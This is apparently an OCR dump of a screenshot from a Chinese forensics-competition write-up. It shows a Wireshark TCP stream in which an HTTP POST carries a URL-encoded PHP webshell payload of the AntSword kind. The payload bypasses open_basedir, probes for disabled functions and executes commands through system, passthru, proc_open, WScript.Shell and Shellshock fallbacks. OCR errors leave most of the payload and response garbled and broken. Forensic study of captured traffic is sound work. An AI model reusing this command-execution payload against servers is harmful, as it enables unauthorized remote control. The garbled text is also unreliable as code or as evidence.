@@ -1,0 +1,67 @@
+# OCR: 88b8d10beb10fd233587750c97810ebe.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/88b8d10beb10fd233587750c97810ebe.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:13
+
+Wireshark·通TCP(tcp.stream eq141)-tcpdump_ti.cap
+POST/peiqi-php.HTTP/1,3 Host:222.2.2.188
+Accept-Encoding:gzipdla
+User-Agenttmozilia/5.e (uindonsNT5.3)Applewebkit/537.36 (KmL,1ike.cecko)chrome/31,e155e.16Safari/537:36 Content-Type:application/x-ww-form-uriencoded
+Content-tength:4638 Connectian: close
+beeab736452ac-1dy2Qgti93d3cvd5d3cn9vdC93d3cudHB:a69hLativb59hcHBsainihd01vb:17d/56aXAgz29/oj3fbGlutnppt0t1V2hv101nl2Rk0383zDt1y2hy15R1YTc1Yiysprxiq30%30kea73814565d65-Tf8jc3 e1d519e9368-FVL23pb19zaA%303D8pelqi-%4eini_set(%22display_errors22%2Ck20%22ex22)x3B%40set_time_1tnit(e)%3B%24opdir%3D54einl_8et(220pen_basedir%22)x381t(3240pdir)%20%7B%24c parr53Dpreg_sp1it(%22%2F%SC%5Cs5C%5C%7C%5CX2F82F%22%2c%240pdir)%3B%240cwd%3Ddirnase(X24_SERVER%5B%22SCRIPT_FILENAHE%22%5D)%38%24tmdir%3D%22.6a52f7d735d%22%3B%48wkdir(%24tndir）%36%48chdi(%24tndi-）3e%4ein1_set（%220open_basedir%22%2C%22：.%22)%3Bfor(%24i%300%38%24%sizeof(%24ope/）$38%245%2n%2B）%7u%4echdi(*22.%22）%sB%7D%40ini_set(*22openbasedi x22%2CX22%2F%22)%3B540rmdir(%240cwd.%22%2Fx22.x24tndir)%38370%38function%2eas
+enc($24cut)%7Breturnx20%24out38%70%38function52easoutput()%78%24outputx30ob_get_contents()×3Bob
+chox28%22c7%22.322f5b822%3Becho%20%40asenc(X24output）%3Becho%20%227eca4%22.x2216a9f9%22%3B%7Dob_start()33Btry%78%24px3Dbase64_decode(substr(%24_P0ST%58%22jc301
+end_clean()%3Bec
+d51989368%22%50%2C2))%30%24s%3Dbase64_decode(substr(%24_P0ST%58%22
+eeab73645c2ac322%50%2C2))%3B%24emvstr%3D548base64_decode(substr(%24_P05T%5B%22ea73814565d65%22%50%2C2))830%
+24d%3Ddin4（%245ERVER%58%225CRIPTFILEN6E%22%5D）%38%24cK3DSUbst(24d%2C0%2C1）83030%22%2F%22%37%22-C*288SC%22%76%245%7D85C%22622%3A822%2Pc%20%5C%22%78%24s%7D85C%22%22%36 f(substr(%24d%2Ca%2C1)%30%30%22%2F%22)%7B%4aputemv(%22PATH%30%22-getenv(%229ATH%22).22%3A%2Fuscx2F10ca1%2Fsbin%3A%2Fusr2F1oca1%2Fbinx3A%2Fusr%2Fsbink3A%2Fusrx2Fbin%3A%2Fsb Sn%3A%2Fbinx22)%3B%7Delse%7B%48puten(%22PATH3D%22-getenv(%22PATH%22).322%38cX3A32FWindoms42Fsystee32%3BC%3A%2FHsng
+ws2FSyshOM64S3BC%3AX2FWindowsX3BC%3AX2FLndows%2FSysten3
+rShe11%2Fv1.0%2F33%22)%38%7Dif(tel
+pty(324envstr))%7p%24em
+2%2FwindowsPo
+warr%30explode(%22%7C*7c%7Casline%7C%7C%7c%22%2C%2e%24envstr)%3Bforeach(%24enwarr%2Bas%20%24v)%20%78
+F%20(/eepty（%24v）%20%78%40putenv(strreplace(%22%7c7c37caskey/%7C57c7CK22%2(%20%22K30%22%2C%20%24v））%b%70%70%70%24/3D%22%78%24p/70%20%78%24c家7D522%38function%20fe(%24f）%7
+(ctriex2carray_*ap(strtolowerx2cx24d))x3B%?
+x24dx3Dexplode(%222Cx22%2C%4eini.et(%22disable
+unctionsx22))%3Bif(enpty(x24d))%78%24cx3Darray()%38%70eIse%78x24dx3Darray_map(
+ex:sts(%24f)%26%261s_cal1able(%24f)%26%26/1n_array($24f%2C%24d))%3B%70%38func
+C%20%24c)%28%7B1f%28(substr(%24d%2C28e%2c%281)%28%30
+n%2erunshe11shock(x24d%2)
+Dreturn(functior
+og：）%20%7c%7c%20fe(11:)））%28%7if%20(strst（ead1ink(%22%2bin%2Fsh%22)%2c%20%22bash%22）%28/%30%20FAL5E）820%
+x30620s22%2F%22828626%26%20fe(:putew)%28626%26%20(fe(erro
+76%24tp2e%30%20tepnam(sys_get_tep_dir(0)%2C%20：邮s：)%3Bputemv(%22PHp_L0%30()%28%78%20xk38%28%70%38%28%24c%20%3e%24tp%202%36%261%22)%38iF%28(fe(err0
+)2e%7Berror1c
+(%22ax22%2C%281)%3B%7D%20e1se%20%7Bna11(X22a%4e127.8.8.1%22%2CX20%22%22%2C%20%22422%2C%20%22-bux22)%38%7D%7D%20e1se%20%78returnx20Falsex38%7D%240utput%20%3D%28%4011e_get_c mtents(%24tmp)%3B%48unlink(%24tsp)%381f%2e($240utput%2e1$30%20%22%22)*2e%78print($240utput)%3Breturn%20True%38%70%70return%20Fal1se%3B%70%38function%20r
+uncmd(324c)%78%24ret30
+0%3B%24d%30dLImBme(K24_SERVER8SUX22SCRIPT_FILENE%22%SD)83Uif(fe(
+systen*))%7D%48system(%24c%2C%24ret)%3B$7Delseif(fe(‘passthru:))%7%40passthru(%24c%2C%24ret)%30%70elseif(f
+e('shell_e
+)%7Bprint(%40she11_exec(%24c))%38%7Delseif(fe("excec)
+rint(join(%22%eA*22%2C%240))$38%70elseif(fe(popen"))%78%24fp%30%4epc
+xec(324c2c824o20324ret)%55p
+nc324c12c k3Es28arra)
+)%3Bwhtle(:%46feof($24fp))%7Bprint(%40fgets($24fp%2C2848))%38%70%48pclcse(%24fp)%3B%7Delseif(fe(
+open：))%78%24p%28%30%20%40pr
+_open(%24cx2C%2earray(1x20%3
+pipe%2c%28w*))%2C%20%2410)$3Bmh1le(/%48feof(%2410%5B1%5D))%7Bprint(%4efgets(%241o8581%5D%2C2048))%3B%7Dhile(1%48feof
+p1pe%2cx2em82%282%280
+30%3E%28
+(%24io%582%50))%78print(%4efgets(%24io%582%5p%22e48))%3%70%4efclose(%24io%81%5p)%3e%4efclose(%24io%552%5D)%38%40proc_clo5e(%24p)%3n%70elseif(fe(*antsystes:))%70%40antsyste/324c33837De1se16runsbe175hock7324c2c283246132378retucn2826ret38320e1se170subtr/324d52c662c11330522528222826263240c1assxitsc2c080220x78324430ne20c N(WScr1pt.she11/)%3B%24e%30%24w-3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%38%24ret.33D%24s0-%3EReadA11()%3B%24se%30%24e-3EStdErr()3B%24/et.%3D%245e-%3EReadA11()%38print(X24 ret)%3B%70else%78%24ret%20%30%28127%38%70return%20%24ret838%70%38%24ret%30%48runcmd(%24c：%22%282%3E%261%22)%38print%28(324ret1%308)83F%22ret%30%78%24ret%70%22%3A%22%22%3B%38%
+70catch(txceptionk2e%24e)%7Bechc32e%22tRR0R%3A27%2F%22.%24e-%3tgetMes5age()%38%7DS3Basoutput()%3Bdie()%3BHTTP/1.320e0K Server:ngim
+Date: Frl, 84 Har 2022 07:17:53 GT Content-Typer.text/htmlg charset-UTF-s
+Transfer-Encoding: chunked Connectien:Close
+Vary:Accept-Encoding Content-Encodingi.gzip
+se
+01o:00060q1001odR5coodlo0008.0018b00000x+0014.0101010008600-00001-1.000000ho09x1001o50o
+分调8337，2户#分视，！股器分证，1品moL送送#，
+服个对活（1792bytes）童
+Show data asUTF-8
+海武
+打印
+男存为
+返回
+关闭
+X
+共141旦国我下一个国
